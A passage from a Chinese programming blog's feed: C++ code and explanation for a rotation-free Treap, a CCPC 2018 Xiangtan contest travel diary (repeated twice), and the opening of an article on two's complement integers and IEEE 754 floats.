<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">split</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">,</span> <span class="kt">int</span> <span class="n">k</span><span class="p">,</span> <span class="kt">int</span> <span class="o">&amp;</span> <span class="n">fstRt</span><span class="p">,</span> <span class="kt">int</span> <span class="o">&amp;</span> <span class="n">sndRt</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">rt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fstRt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">sndRt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">k</span> <span class="o">&lt;=</span> <span class="n">lson</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sndRt</span> <span class="o">=</span> <span class="n">rt</span><span class="p">;</span> 
        <span class="n">split</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">k</span><span class="p">,</span> <span class="n">fstRt</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">fstRt</span> <span class="o">=</span> <span class="n">rt</span><span class="p">;</span> 
        <span class="n">split</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">k</span> <span class="o">-</span> <span class="n">lson</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sndRt</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">maintain</span><span class="p">(</span><span class="n">rt</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><hr>
<p>对于按权值分裂也是同理的，这里就只给出代码了：</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">splitByVal</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">,</span> <span class="kt">int</span> <span class="n">val</span><span class="p">,</span> <span class="kt">int</span> <span class="o">&amp;</span> <span class="n">fstRt</span><span class="p">,</span> <span class="kt">int</span> <span class="o">&amp;</span> <span class="n">sndRt</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">rt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fstRt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">sndRt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">val</span> <span class="o">&gt;</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sndRt</span> <span class="o">=</span> <span class="n">rt</span><span class="p">;</span>
        <span class="n">splitByVal</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">val</span><span class="p">,</span> <span class="n">fstRt</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">fstRt</span> <span class="o">=</span> <span class="n">rt</span><span class="p">;</span>
        <span class="n">splitByVal</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">val</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sndRt</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">maintain</span><span class="p">(</span><span class="n">rt</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><h1 id="这意味着什么">这意味着什么？</h1>
<h2 id="支持快速插入删除的数组">支持快速插入删除的数组</h2>
<ul>
<li>在任意位置 $k$ 插入节点 $V$：
<ul>
<li>$\text{split}(T, k, A, B)$;</li>
<li>$T = \text{merge}(\text{merge}(A, V), B)$;</li>
</ul>
</li>
<li>在任意位置 $k$ 删除节点：
<ul>
<li>$\text{split}(T, k - 1, A, B)$;</li>
<li>$\text{split}(B, 1, _, B)$;</li>
<li>$T = \text{merge}(A, B)$;</li>
</ul>
</li>
<li>询问位置 $k$ 处节点的值：
<ul>
<li>$\text{split}(T, k - 1, A, B)$;</li>
<li>$\text{split}(B, 1, B, C)$;</li>
<li>得到了 $B$ 节点的值~</li>
<li>$\text{merge}(\text{merge}(A, B), C)$;</li>
</ul>
</li>
</ul>
<p>看起来很有用~ 基本可以代替掉块状链表了。</p>
<h2 id="平衡树">平衡树</h2>
<p>我们不妨先直接拉一道家喻户晓的模板题来举个例子：<a href="https://loj.ac/problem/104">普通平衡树 - 题目 - LibreOJ</a>。</p>
<p>题目中要求我们实现 $6$ 类操作：</p>
<ol>
<li>插入数 $x$；</li>
<li>删除数 $x$（若有多个相同的 $x$ 则只删除一个）；</li>
<li>查询数 $x$ 的排名（若有多个相同的 $x$ 则输出最小排名）；</li>
<li>查询排名为 $x$ 的数；</li>
<li>求 $x$ 的前驱（即小于 $x$ 的数中的最大值）；</li>
<li>求 $x$ 的后继（即大于 $x$ 的数中的最小值）。</li>
</ol>
<p>下面我们就试着主要靠两个核心函数来解决上述 $6$ 个问题。</p>
<h3 id="插入">插入</h3>
<p>首先我们将带插入节点的 $\text{rnd}$ 赋成随机值，然后按 $x$ 将 Treap $\text{split}$ （按权值分裂） 成小于等于 $x$ 的 $A$ 和大于 $x$ 的 $B$。我们不妨把待插入的 $x$ 看成一棵只含一个节点的 Treap，先将其与 $A$ $\text{merge}$，再得到的 Treap 与 $B$ $\text{merge}$，就完成插入了。</p>
<h3 id="删除">删除</h3>
<p>与插入类似，首先我们按 $x$ 将 Treap $\text{split}$ 成小于等于 $x$ 的 $A$ 和大于 $x$ 的 $B$，再将 $A$ $\text{split}$ 成小于等于 $x - 1$ 的 $C$ 和大于 $x - 1$（即等于 $x$）的 $D$。接下来，我们将 $B$ 和 $C$ $\text{merge}$ 在一起即可。</p>
<p>上述操作会把所有等于 $x$ 的数全部删掉。如果题目只要求删掉一个 $x$，可以考虑将 $D$ 的左子树和右子树合并在一起得到 $E$。这样一来就等于舍弃了 $D$ 的根节点，使得 $D$ 中等于 $x$ 的数少了一个。最后再把 $E$ 也 $\text{merge}$ 进答案。</p>
<h3 id="查询数的排名">查询数的排名</h3>
<p>实际上就是查询有多少个数比 $x$ 小，然后将结果加 $1$ 即是排名。</p>
<p>考虑现按 $x - 1$ 将 Treap $\text{split}$ 成 $A$ 和 $B$，这样一来 $A$ 的大小加上 $1$ 就是我们需要的答案。查询完后再将 $A$ 和 $B$ $\text{merge}$ 起来恢复原状即可。</p>
<h3 id="查询排名对应的数">查询排名对应的数</h3>
<p>我们只需要实现按排名分裂，就可以跟上面类似直接 $\text{split}$ 一下就好了。</p>
<h3 id="查询前驱或后继">查询前驱或后继</h3>
<p>这里我们以查询前驱为例（后继完全同理）：</p>
<p>我们考虑先将 Treap 按 $x - 1$ $\text{split}$ 成 $A$ 和 $B$，那么 $A$ 树中最大的数（即第 $A.size$ 大）就是我们要查询的答案。借用上面的查询排名对应数的函数即可实现。</p>
<h3 id="参考代码">参考代码</h3>
<p>大家可以看看 <a href="https://github.com/codgician/Competitive-Programming/blob/master/LOJ/104/treap_without_rotations.cpp">我的代码</a> 来对照理解一番~</p>
<h1 id="heading">%%%</h1>
<ul>
<li>chen_tr - <a href="https://blog.csdn.net/chen_tr/article/details/50924073">偷懒专用平衡树——Treap</a></li>
<li>LadyLex - <a href="https://www.cnblogs.com/LadyLex/p/7182491.html">无旋treap：从好奇到入门</a></li>
<li>yyf0309 - <a href="https://www.cnblogs.com/yyf0309/p/Unrotated_Treap.html">无旋转Treap简介</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>CCPC 2018 湘潭邀请赛游记</title>
			<link>https://codgician.me/zh-hans/posts/2018/05/ccpc-2018-xiangtan-travel-notes/</link>
			<pubDate>Wed, 16 May 2018 13:19:35 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/05/ccpc-2018-xiangtan-travel-notes/</guid>
			<description>Day 0 打印了 Claris 巨佬的模板（虽然看不懂），顺便打印了几个自己整理的常用模板（然而最后全都没用上）。 下午收拾东西，不知道哪里一抽就把小黄兔和蛤乐器</description>
			<content type="html"><![CDATA[<h1 id="day-0">Day 0</h1>
<p>打印了 Claris 巨佬的模板（虽然看不懂），顺便打印了几个自己整理的常用模板（然而最后全都没用上）。</p>
<p>下午收拾东西，不知道哪里一抽就把小黄兔和蛤乐器带上了。</p>
<p>坐地铁到了杭州东站，17:50 上了学校报销的硬卧火车，车上偶遇浙江工商大学的巨佬，得知他们参加过区域赛感觉打扰了。他们说他们学校另外两个队都坐飞机（因为他们去年拿了银），而且学校报销，无限羡慕 QAQ。</p>
<p>车上一位老奶奶问起我们是去湘潭干嘛的，我们异口同声表示是去打电竞 😂 。</p>
<p>没上车多久就忍不住吃面包，然后一不小心把明天早餐的部分也吃完了。刚开始还翻看了一下自己带的《编程之美》，然后感觉车上的环境完全看不下去就开始划水了。</p>
<p>熄灯之前 jackyan 巨佬让我拿出之前打印的 2017 湘潭邀请赛题册，于是我也没法继续愉快地划水了。拿出了题册一起看，发现怎么有两道高斯消元，好可啪。xywsxp 巨佬也过来观摩题目。其中有一题大意是在给定图中删去最少边数使得 MST 变大。 xywsxp 在集训队群里面问了一波，然后老刘秒回“最短边删除不是就变大了吗”，然后 Claris 神犇秒打脸表示要用最小割，然后老刘就问起出发顺不顺利了 🙈。感觉好尴尬啊（<del>虽然本垃圾也有过这一念头</del>），%%% Claris。</p>
<p>晚上 Hanano 巨佬表示睡什么觉并安利了达芬奇睡眠法，瑟瑟发抖。最后十一点过的时候我忍不住还是滚到床上去睡觉了 QAQ。</p>
<h1 id="day-1">Day 1</h1>
<p>睡觉时完全处于一个小时醒一次的状态，于是四点过的时候就受不了爬起来<del>看日出</del>，然后发现 Hanano 貌似在下面待了一个晚上 QAQ。</p>
<p>下车出站后坐公交一路飙到了湘潭大学东门，然后来到了人均 30 人民币一晚的住宿，<del>终于知道为什么老刘不来带队了</del>，感觉被卖了 😭。</p>
<p>早餐混进了湘潭大学食堂解决，食堂的师傅热心地表示支持支付宝的，然后说完就现场拉了个学生喊他帮我们刷卡然后我们转账给他。怪不好意思的 QAQ。本想照顾队友不吃辣的口味于是一起点了“北京炸酱面”，但面做好后发现竟然是臊子红油拌面 orz。队友貌似被学校食堂的辣椒酱惯坏了，还勇敢地加了几勺旁边的辣酱 🙈 。这锅我不背（逃</p>
<p>中午本想跟 xywsxp 一起吃石锅鱼，然而由于他的花样乱带路我们就抛弃他去吃低配版华莱士了（逃</p>
<p>下午领了狗牌和衣服后就是热身赛了。热身赛只有一个半小时，感觉好短 QAQ。调了一下环境，本来想用 Sublime 结果配 build file 的时候貌似写错了一个地方一直没调好，于是就只好用 Dev C++ 了。</p>
<p>一看 A 题，感觉是个暴搜，然而不敢上，于是就开 B，发现 B 是个超级大模拟，怕写挂还是不敢上，于是就开 C 题，感觉 C 题貌似可做，想到可以把原矩阵和目标矩阵异或一下只要判断异或后的矩阵能不能按题目规则化为全 0 矩阵就好了。然后和队友脑袋一热猜结论只要 1 的个数能被 4 整除就可以了&hellip; WA&hellip; 然后很快就找出反例了。Hanano 巨佬貌似有自己的想法了，然后 C 题就交给他去码了。D 题显然是个 DP，然而我当时 DP 方程式推错（实际上少算了非第一个数开始的能被 3 整除的数）。差点以为热身赛要爆零，还好 Hanano 巨佬在最后十分钟左右 A 掉了 C 题，然后我立马开始码 D 题，结果发现样例没过，然后就一题滚粗了。</p>
<p>南邮巨佬好强啊，热身赛进行了一半就 AK 走人了。</p>
<p>在去觅食的路上反应过来了错在哪里，然后回招待所加了一行代码就过了样例，心情跌入谷底。无心复习的我晚上打了若干局 Wordament 和数独。</p>
<p><img src="/posts/life/ccpc-2018-xiangtan-travel-notes/cover.jpg" alt="欢迎牌"></p>
<h1 id="day-2">Day 2</h1>
<p>早上起来感觉慌慌的，把开幕式翘了直接去了赛场。</p>
<p>Hanano 赛前就猜 F 题是签到题，比赛开始后第一个就开了 F 题，挂了一次后 A 掉了，太强了orz。</p>
<p>jackyan 貌似阅读 A 题的时候到了一点语言障碍，本来还在推 K 题的我过去看了看，发现是道大水题，然后就 1A 了，于是 jackyan 就去开 B 题了。</p>
<p>A 掉了 A 题后我意识到 A、B、C 三道题貌似是一个系列的，就去看了看 C 题。感觉是个线段树，然而没想出来怎么区间合并，所以就感觉是分块或者莫队。然而我都不会，所以准备丢给队友 🙈。与此同时 Hanano 又用容斥原理 A 掉了 K 题，好强啊 QAQ。所以我就去看 D 题了。</p>
<p>D 题我推了半天没有太确切的思路，看了一下榜发现没人过，果断放弃。Hanano 让我跟他去看看 G 题，然后 Hanano 巨佬很快想到了正解，1A，太强了orz。</p>
<p>看了看榜发现好多人都过了 C 题，于是我们一起开了 C 题。我们用莫队 + 树状数组 + 二分瞎搞出来了一个复杂度 $\mathcal{O}(N\sqrt{N}log^2{N})$ 的算法。由于队里就本垃圾不会写莫队，Hanano 表示状态不好，所以 Hanano 写了一半后就交给 jackyan 巨佬去写了，没想到第一发交竟然是 WA 不是 TLE，顿觉有希望。瞎改了一下莫队后又交一发，竟然 A 了。进入疯狂膜队友模式 %%%。</p>
<p>接下来就是循环卡题的时光了QAQ。我们主要尝试攻 B 题和 J 题，另外我也继续把 D 题和 I 题考虑了一波，然而很遗憾直到比赛结束都没搞出来，五题滚粗。<del>本垃圾 A 了一道大水题后就全程划水，好惭愧啊 QAQ</del>。</p>
<p>另外，午餐竟然是麦当劳，超级好评！</p>
<p>下午讲题的时候得知 B 题竟然是结论题，只要一篇论文一小时就好，吐血 QAQ。讲题人表示题是叉姐出的，有问题问叉姐，然后就光速讲完了，留下我一脸懵逼。</p>
<p>没想到竟然水到了一个银奖，然而摸一下奖牌后又要还给老刘堆在集训室了 QAQ。</p>
<p>jackyan 巨佬貌似对我有了一句新的口头禅 “你羞愧吗？” QAQ 😶</p>
<p>下午五点过就来到了火车站…… 打了若干盘斗地主，每次我发牌 jackyan 都会莫名其妙地当上地主，然后将本垃圾狂虐 QAQ。</p>
<p>然后湘潭两日游就这么结束了（逃</p>
<h1 id="赛后总结">赛后总结</h1>
<p><del>可以明显感到这场比赛中我太水了。</del></p>
<p>这场比赛反映出了我个人在思维能力上的不足。平时做专题的时候侧重点都在于学习新的算法而忽略了对思维的培养。这就造成一个很尴尬的局面，简单的思维题（诸如 DP）做不来，而比赛时需要稍微难一点算法的题目又不可能是裸的模板题，所以还是做不来。 🙈</p>
<p>看起来下个月要抽时间多练练 DP 以及数学了。 QAQ</p>
]]></content>
		</item>
		
		<item>
			<title>CCPC 2018 湘潭邀请赛游记</title>
			<link>https://codgician.me/zh-hans/posts/2018/05/ccpc-2018-xiangtan-travel-notes/</link>
			<pubDate>Wed, 16 May 2018 13:19:35 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/05/ccpc-2018-xiangtan-travel-notes/</guid>
			<description>Day 0 打印了 Claris 巨佬的模板（虽然看不懂），顺便打印了几个自己整理的常用模板（然而最后全都没用上）。 下午收拾东西，不知道哪里一抽就把小黄兔和蛤乐器</description>
			<content type="html"><![CDATA[<h1 id="day-0">Day 0</h1>
<p>打印了 Claris 巨佬的模板（虽然看不懂），顺便打印了几个自己整理的常用模板（然而最后全都没用上）。</p>
<p>下午收拾东西，不知道哪里一抽就把小黄兔和蛤乐器带上了。</p>
<p>坐地铁到了杭州东站，17:50 上了学校报销的硬卧火车，车上偶遇浙江工商大学的巨佬，得知他们参加过区域赛感觉打扰了。他们说他们学校另外两个队都坐飞机（因为他们去年拿了银），而且学校报销，无限羡慕 QAQ。</p>
<p>车上一位老奶奶问起我们是去湘潭干嘛的，我们异口同声表示是去打电竞 😂 。</p>
<p>没上车多久就忍不住吃面包，然后一不小心把明天早餐的部分也吃完了。刚开始还翻看了一下自己带的《编程之美》，然后感觉车上的环境完全看不下去就开始划水了。</p>
<p>熄灯之前 jackyan 巨佬让我拿出之前打印的 2017 湘潭邀请赛题册，于是我也没法继续愉快地划水了。拿出了题册一起看，发现怎么有两道高斯消元，好可啪。xywsxp 巨佬也过来观摩题目。其中有一题大意是在给定图中删去最少边数使得 MST 变大。 xywsxp 在集训队群里面问了一波，然后老刘秒回“最短边删除不是就变大了吗”，然后 Claris 神犇秒打脸表示要用最小割，然后老刘就问起出发顺不顺利了 🙈。感觉好尴尬啊（<del>虽然本垃圾也有过这一念头</del>），%%% Claris。</p>
<p>晚上 Hanano 巨佬表示睡什么觉并安利了达芬奇睡眠法，瑟瑟发抖。最后十一点过的时候我忍不住还是滚到床上去睡觉了 QAQ。</p>
<h1 id="day-1">Day 1</h1>
<p>睡觉时完全处于一个小时醒一次的状态，于是四点过的时候就受不了爬起来<del>看日出</del>，然后发现 Hanano 貌似在下面待了一个晚上 QAQ。</p>
<p>下车出站后坐公交一路飙到了湘潭大学东门，然后来到了人均 30 人民币一晚的住宿，<del>终于知道为什么老刘不来带队了</del>，感觉被卖了 😭。</p>
<p>早餐混进了湘潭大学食堂解决，食堂的师傅热心地表示支持支付宝的，然后说完就现场拉了个学生喊他帮我们刷卡然后我们转账给他。怪不好意思的 QAQ。本想照顾队友不吃辣的口味于是一起点了“北京炸酱面”，但面做好后发现竟然是臊子红油拌面 orz。队友貌似被学校食堂的辣椒酱惯坏了，还勇敢地加了几勺旁边的辣酱 🙈 。这锅我不背（逃</p>
<p>中午本想跟 xywsxp 一起吃石锅鱼，然而由于他的花样乱带路我们就抛弃他去吃低配版华莱士了（逃</p>
<p>下午领了狗牌和衣服后就是热身赛了。热身赛只有一个半小时，感觉好短 QAQ。调了一下环境，本来想用 Sublime 结果配 build file 的时候貌似写错了一个地方一直没调好，于是就只好用 Dev C++ 了。</p>
<p>一看 A 题，感觉是个暴搜，然而不敢上，于是就开 B，发现 B 是个超级大模拟，怕写挂还是不敢上，于是就开 C 题，感觉 C 题貌似可做，想到可以把原矩阵和目标矩阵异或一下只要判断异或后的矩阵能不能按题目规则化为全 0 矩阵就好了。然后和队友脑袋一热猜结论只要 1 的个数能被 4 整除就可以了&hellip; WA&hellip; 然后很快就找出反例了。Hanano 巨佬貌似有自己的想法了，然后 C 题就交给他去码了。D 题显然是个 DP，然而我当时 DP 方程式推错（实际上少算了非第一个数开始的能被 3 整除的数）。差点以为热身赛要爆零，还好 Hanano 巨佬在最后十分钟左右 A 掉了 C 题，然后我立马开始码 D 题，结果发现样例没过，然后就一题滚粗了。</p>
<p>南邮巨佬好强啊，热身赛进行了一半就 AK 走人了。</p>
<p>在去觅食的路上反应过来了错在哪里，然后回招待所加了一行代码就过了样例，心情跌入谷底。无心复习的我晚上打了若干局 Wordament 和数独。</p>
<p><img src="/posts/icpc-notes/ccpc-2018-xiangtan-travel-notes/cover.jpg" alt="欢迎牌"></p>
<h1 id="day-2">Day 2</h1>
<p>早上起来感觉慌慌的，把开幕式翘了直接去了赛场。</p>
<p>Hanano 赛前就猜 F 题是签到题，比赛开始后第一个就开了 F 题，挂了一次后 A 掉了，太强了orz。</p>
<p>jackyan 貌似阅读 A 题的时候到了一点语言障碍，本来还在推 K 题的我过去看了看，发现是道大水题，然后就 1A 了，于是 jackyan 就去开 B 题了。</p>
<p>A 掉了 A 题后我意识到 A、B、C 三道题貌似是一个系列的，就去看了看 C 题。感觉是个线段树，然而没想出来怎么区间合并，所以就感觉是分块或者莫队。然而我都不会，所以准备丢给队友 🙈。与此同时 Hanano 又用容斥原理 A 掉了 K 题，好强啊 QAQ。所以我就去看 D 题了。</p>
<p>D 题我推了半天没有太确切的思路，看了一下榜发现没人过，果断放弃。Hanano 让我跟他去看看 G 题，然后 Hanano 巨佬很快想到了正解，1A，太强了orz。</p>
<p>看了看榜发现好多人都过了 C 题，于是我们一起开了 C 题。我们用莫队 + 树状数组 + 二分瞎搞出来了一个复杂度 $\mathcal{O}(N\sqrt{N}log^2{N})$ 的算法。由于队里就本垃圾不会写莫队，Hanano 表示状态不好，所以 Hanano 写了一半后就交给 jackyan 巨佬去写了，没想到第一发交竟然是 WA 不是 TLE，顿觉有希望。瞎改了一下莫队后又交一发，竟然 A 了。进入疯狂膜队友模式 %%%。</p>
<p>接下来就是循环卡题的时光了QAQ。我们主要尝试攻 B 题和 J 题，另外我也继续把 D 题和 I 题考虑了一波，然而很遗憾直到比赛结束都没搞出来，五题滚粗。<del>本垃圾 A 了一道大水题后就全程划水，好惭愧啊 QAQ</del>。</p>
<p>另外，午餐竟然是麦当劳，超级好评！</p>
<p>下午讲题的时候得知 B 题竟然是结论题，只要一篇论文一小时就好，吐血 QAQ。讲题人表示题是叉姐出的，有问题问叉姐，然后就光速讲完了，留下我一脸懵逼。</p>
<p>没想到竟然水到了一个银奖，然而摸一下奖牌后又要还给老刘堆在集训室了 QAQ。</p>
<p>jackyan 巨佬貌似对我有了一句新的口头禅 “你羞愧吗？” QAQ 😶</p>
<p>下午五点过就来到了火车站…… 打了若干盘斗地主，每次我发牌 jackyan 都会莫名其妙地当上地主，然后将本垃圾狂虐 QAQ。</p>
<p>然后湘潭两日游就这么结束了（逃</p>
<h1 id="赛后总结">赛后总结</h1>
<p><del>可以明显感到这场比赛中我太水了。</del></p>
<p>这场比赛反映出了我个人在思维能力上的不足。平时做专题的时候侧重点都在于学习新的算法而忽略了对思维的培养。这就造成一个很尴尬的局面，简单的思维题（诸如 DP）做不来，而比赛时需要稍微难一点算法的题目又不可能是裸的模板题，所以还是做不来。 🙈</p>
<p>看起来下个月要抽时间多练练 DP 以及数学了。 QAQ</p>
]]></content>
		</item>
		
		<item>
			<title>乱谈整型与浮点</title>
			<link>https://codgician.me/zh-hans/posts/2017/08/on-int-and-float/</link>
			<pubDate>Fri, 18 Aug 2017 22:43:10 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2017/08/on-int-and-float/</guid>
			<description>前言 前几天好友终于也入了 C/C++ 的邪教，问起了几个浮点相关的问题，让我终于意识到深陷现代语言泥潭的我早已忘却这些富有趣味但又基础地不能在基础的知识</description>
			<content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>前几天好友终于也入了 C/C++ 的邪教，问起了几个浮点相关的问题，让我终于意识到<del>深陷现代语言泥潭</del>的我早已忘却这些富有趣味但又基础地不能在基础的知识…… 在网上大量查阅相关资料后决定属文以记之。</p>
<h1 id="整型">整型</h1>
<p>注：本文中默认 <code>int</code> 长度为 $32$ 位。</p>
<h2 id="无符号整形">无符号整形</h2>
<p>这里以 <code>unsigned int</code> 为例（$32$ 位）。<code>unsigned int</code> 就是没有符号的 <code>int</code>，在内存里占用 $4$ Byte，也就是 $32$ bit。很容易得知其能存储的最小值为 $0$，最大值则为 $2^{32} - 1 = 4294967295$。</p>
<h2 id="整形">整形</h2>
<p>int 是带有符号的，因此其所占据的第 $0 \sim 31$ 位中第 $31$ 位是用于存储符号的（$0$ 为正，$1$ 为负）。当然你会问，既然所有位均为 $0$ 时变量的值为 $0$，那么符号位为 $1$ 时剩余位为 $0$ 表示的又是什么呢？</p>
<p>这里就要牵扯进 <em>补数 (2’s complement，又称二补数)</em> 的概念了。</p>
<blockquote>
<p>一个数字的二补数就是将该数字作<em>比特反相运算（即反码）</em>，再将结果加 1。在二补数系统中，一个负数就是用其对应正数的二补数来表示。(<em>Wikipedia</em>，有修改)</p>
</blockquote>
<p>而借助二补数性质进行编码的编码系统则简称补码，在补码系统中，我们采用如下方式表示每一个数：</p>
<ul>
<li>对于非负数，采用原始二进制表示；</li>
<li>对于负数，符号位为 $1$，剩余位采用其补数表示。</li>
</ul>
<p>为了方便，我们假定一种只有 $8$ 位的整型数据类型来举几个例子（注意下面列出的是对应的补码不是二补数）：</p>
<table>
<thead>
<tr>
<th>符号位</th>
<th></th>
<th>=</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1 1 1 1 1 1 1</td>
<td><strong>127</strong></td>
</tr>
<tr>
<td>0</td>
<td>0 0 0 0 0 1 0</td>
<td><strong>2</strong></td>
</tr>
<tr>
<td>0</td>
<td>0 0 0 0 0 0 1</td>
<td><strong>1</strong></td>
</tr>
<tr>
<td>0</td>
<td>0 0 0 0 0 0 0</td>
<td><strong>0</strong></td>
</tr>
<tr>
<td>1</td>
<td>1 1 1 1 1 1 1</td>
<td><strong>-1</strong></td>
</tr>
<tr>
<td>1</td>
<td>1 1 1 1 1 1 0</td>
<td><strong>-2</strong></td>
</tr>
<tr>
<td>1</td>
<td>0 0 0 0 0 0 1</td>
<td><strong>-127</strong></td>
</tr>
<tr>
<td>1</td>
<td>0 0 0 0 0 0 0</td>
<td><strong>-128</strong></td>
</tr>
</tbody>
</table>
<p>我们可以容易地总结出以下两点：</p>
<ul>
<li>取负运算实际上就是取该数的二补数 ($\sim x + 1$)。</li>
<li>有两个数的二补数等于其本身：$0$ 和 $-128$ (溢出了，所以就变成自己了)。</li>
</ul>
<p>至此，我们也应该理解为什么 $32$ 位整型的取值范围是 $-2147483648 \sim 2147483647$ 了。</p>
<h1 id="浮点">浮点</h1>
<p>在 C 语言中，浮点数的存储均遵循 IEEE 754 标准。我们不妨结合标准内容来对 <code>float</code> 做一番介绍。</p>
<p>注：并不是在任何情况下浮点数的存储都遵循 IEEE 754 标准！这里仅介绍 IEEE 754 标准。</p>
<h2 id="整体结构">整体结构</h2>
<p>在 IEEE 754 中，浮点数的存储被划为三个部分：<em>符号位 (sign bit)、阶码 (biased exponent)、尾码 (mantissa)</em>。在单精度中它们的长度分别为 $1$ bit、$8$ bit 和 $23$  bit；双精度中它们的长度分别为 $1$ bit、$11$ bit 和 $52$ bit。</p>
<p>为了方便展示，不妨从 <a href="https://en.wikipedia.org/wiki/IEEE_754-1985#Representation_of_non-numbers">Wikipedia</a> 盗两张图下来（遵循  <a href="https://en.wikipedia.org/wiki/Wikipedia:Text_of_Creative_Commons_Attribution-ShareAlike_3.0_Unported_License">Creative Commons Attribution-ShareAlike License</a>）：</p>
<h3 id="单精度">单精度</h3>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/IEEE_754_Single_Floating_Point_Format.svg" alt="Single precision"></p>
<h3 id="双精度">双精度</h3>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/IEEE_754_Double_Floating_Point_Format.svg" alt="Double precision"></p>
<p>我们知道任意一个<strong>二进制</strong>浮点数 $V$ 都可以表示为（科学记数法）：</p>
<p>$$
V = (-1)^s \cdot M \cdot 2^E
$$</p>
<p>其中，$s$ 是<strong>符号位</strong>，$M$ 是有效数字（$1 \le M &lt; 2$），$E$ 是指数。</p>
<p>举个例子，对于十进制小数 $0.15625$，其二进制表示为 $0.00101$，用二进制下的科学记数法表示就是 $0.00101 = 1.01 \times 2^{-3}$，那么其符号位为 $0$，有效数字为 $1.01$，尾码为 $.01$，指数为 $-3$。</p>
<p>我们很容易发现，$M$ 的整数部分一定恒为 $1$，那还存什么存？只用存 $M$ 的小数部分就行了，所以<strong>尾码</strong>就是 $M - 1$。</p>
<h2 id="指数偏移值">指数偏移值</h2>
<p>依据前文对阶码存储结构的介绍，<strong>阶码</strong>看起来就像是一个无符号整数。可惜科学记数法中指数是可以为负数的。怎么办？IEEE 就搞了个 <em>指数偏移值 (exponent bias)</em> 出来。指数偏移值就是指<strong>浮点数表示法中的指数域的编码值（即阶码的值）为指数的实际值加上某个固定的值</strong>（阶码 = $E$ + 指数偏移值）。在 IEEE 754 标准中，指数偏移值的固定大小为 $2^{e - 1} - 1$，其中 $e$ 为储存指数的比特长度。</p>
<p>例如，在单精度中，阶码位长 $e$ 为 8 bit，换算成十进制其可表示范围为 $0 \sim 255$。依据前文，其指数偏移值是 $2^{8 - 1} - 1 = 127$。这样一来，对于单精度浮点数类型指数就可取 $-127 \sim 128$ 了。</p>
<h2 id="规约形式与非规约形式">规约形式与非规约形式</h2>
<h3 id="规约形式-normalized-numbers">规约形式 (Normalized numbers)</h3>
<p><strong>规约形式的浮点数</strong>指的是<strong>阶码</strong>范围为 $(0, 2^{e} - 1)$ ，且<strong>尾码</strong>部分最高有效位（即整数部分）为 $1$ 的浮点数。也就是说，前文中我们讨论的浮点数都是规约形式的。</p>
<h3 id="非规约形式-denormalized-numbers">非规约形式 (Denormalized numbers)</h3>
<p>为了减小因为<em>下溢 (underflow)</em> 造成的精度损失（换言之，为了使得浮点数可表示的正最小值和负最大值更接近 $0$），IEEE 754 标准中提出了非规约形式浮点数——用于填补最小正数和最大负数与 $0$ 的距离。</p>
